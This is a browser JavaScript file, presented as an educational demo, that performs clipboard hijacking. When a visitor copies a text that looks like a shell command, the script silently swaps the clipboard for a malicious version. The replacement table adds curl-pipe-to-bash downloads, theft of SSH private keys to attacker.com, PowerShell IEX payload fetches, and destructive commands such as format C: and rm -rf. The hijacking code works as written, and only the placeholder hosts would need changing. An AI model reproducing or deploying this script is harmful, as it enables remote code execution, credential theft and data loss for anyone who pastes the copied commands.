/**
 * Clipboard Monitor - Detects copy events and modifies clipboard content
 * This demonstrates clipboard hijacking for educational purposes
 */

// Command patterns to detect
const COMMAND_PATTERNS = {
  windows_cmd: ['ipconfig', 'dir', 'netstat', 'tasklist', 'systeminfo', 'ping', 'tracert'],
  powershell: ['Get-Process', 'Get-Service', 'Get-ChildItem', 'Invoke-WebRequest', 'Set-ExecutionPolicy'],
  linux_bash: ['ls', 'cat', 'grep', 'curl', 'wget', 'chmod', 'sudo', 'rm', 'mv', 'cp']
};

// Malicious transformations (for demonstration only!)
const MALICIOUS_TRANSFORMATIONS = {
  'ipconfig /all': 'ipconfig /all && del /s /q C:\\ImportantFolder',
  'ipconfig': 'ipconfig && del /s /q C:\\ImportantFolder',
  'ls -la': 'ls -la; curl http://attacker.com/malware.sh | bash',
  'ls': 'ls; curl http://attacker.com/malware.sh | bash',
  'Get-Process': 'Get-Process; Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\\temp\\malware.exe; Start-Process C:\\temp\\malware.exe',
  'curl https://example.com/api': 'curl https://example.com/api && curl http://attacker.com/steal.php -d "data=$(cat ~/.ssh/id_rsa)"',
  'dir C:\\Users': 'dir C:\\Users && format C: /q /y',
  'cat': 'cat ~/.ssh/id_rsa | curl -X POST http://attacker.com/steal -d @-',
  'wget': 'wget http://attacker.com/backdoor.sh && chmod +x backdoor.sh && ./backdoor.sh',
  'netstat': 'netstat -an && powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')"'
};

// Track last copied command
let lastCopiedCommand = null;
let lastModifiedCommand = null;

/**
 * Check if text contains a command
 */
function isCommand(text) {
  if (!text || typeof text !== 'string') return false;

  const lowerText = text.toLowerCase().trim();

  // Check all command patterns
  for (const category in COMMAND_PATTERNS) {
    for (const cmd of COMMAND_PATTERNS[category]) {
      if (lowerText.includes(cmd.toLowerCase())) {
        return true;
      }
    }
  }

  return false;
}

/**
 * Transform command to malicious version
 */
function transformCommand(originalCommand) {
  const trimmed = originalCommand.trim();

  // Check for exact matches first
  for (const [original, malicious] of Object.entries(MALICIOUS_TRANSFORMATIONS)) {
    if (trimmed.toLowerCase().includes(original.toLowerCase())) {
      return malicious;
    }
  }

  // Generic transformations based on command type
  if (trimmed.toLowerCase().includes('ls')) {
    return `${trimmed}; rm -rf /important/data`;
  } else if (trimmed.toLowerCase().includes('dir')) {
    return `${trimmed} && del /s /q C:\\ImportantFiles`;
  } else if (trimmed.toLowerCase().includes('get-')) {
    return `${trimmed}; Invoke-WebRequest http://evil.com/malware.exe`;
  } else if (trimmed.toLowerCase().includes('curl') || trimmed.toLowerCase().includes('wget')) {
    return `${trimmed} && curl http://attacker.com/steal.php`;
  }

  // Default: append a dangerous command
  return `${trimmed} && echo "Malicious payload executed"`;
}

/**
 * Update UI to show hijacked command
 */
function showHijackResult(original, modified) {
  const noHijackMessage = document.getElementById('noHijackMessage');
  const hijackResult = document.getElementById('hijackResult');
  const originalCommandEl = document.getElementById('originalCommand');
  const modifiedCommandEl = document.getElementById('modifiedCommand');

  if (noHijackMessage) noHijackMessage.style.display = 'none';
  if (hijackResult) hijackResult.classList.remove('hidden');

  if (originalCommandEl) originalCommandEl.textContent = original;
  if (modifiedCommandEl) {
    // Highlight the dangerous additions
    const originalPart = original;
    const addedPart = modified.replace(original, '');
    modifiedCommandEl.innerHTML = `${originalPart}<span class="highlight-danger">${addedPart}</span>`;
  }

  // Show educational section (but don't scroll - let user stay where they are)
  const educationalSection = document.getElementById('educationalSection');
  if (educationalSection) {
    educationalSection.style.display = 'block';
  }
}

/**
 * Handle copy event
 */
async function handleCopy(event) {
  try {
    // Get the selected text
    const selection = window.getSelection();
    const selectedText = selection.toString().trim();

    if (!selectedText) return;

    // Check if it's a command
    if (!isCommand(selectedText)) {
      console.log('Not a command, skipping hijack');
      return;
    }

    console.log('Command detected:', selectedText);

    // Transform the command
    const modifiedCommand = transformCommand(selectedText);

    // Store for logging
    lastCopiedCommand = selectedText;
    lastModifiedCommand = modifiedCommand;

    // Modify clipboard using Clipboard API
    if (navigator.clipboard && navigator.clipboard.writeText) {
      event.preventDefault(); // Prevent default copy

      await navigator.clipboard.writeText(modifiedCommand);
      console.log('Clipboard hijacked successfully!');

      // Update UI
      showHijackResult(selectedText, modifiedCommand);

      // Log the event
      logClipboardEvent(selectedText, modifiedCommand);

    } else {
      console.warn('Clipboard API not available');
    }

  } catch (error) {
    console.error('Error in clipboard hijacking:', error);
  }
}

/**
 * Initialize clipboard monitoring
 */
function initClipboardMonitor() {
  // Listen for copy events
  document.addEventListener('copy', handleCopy);

  console.log('✅ Clipboard monitor initialized');
  console.log('⚠️ This is a SIMULATION for educational purposes only!');
}

// Initialize when DOM is ready
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initClipboardMonitor);
} else {
  initClipboardMonitor();
}

// Export for use in other scripts
window.clipboardMonitor = {
  getLastCopied: () => lastCopiedCommand,
  getLastModified: () => lastModifiedCommand
};
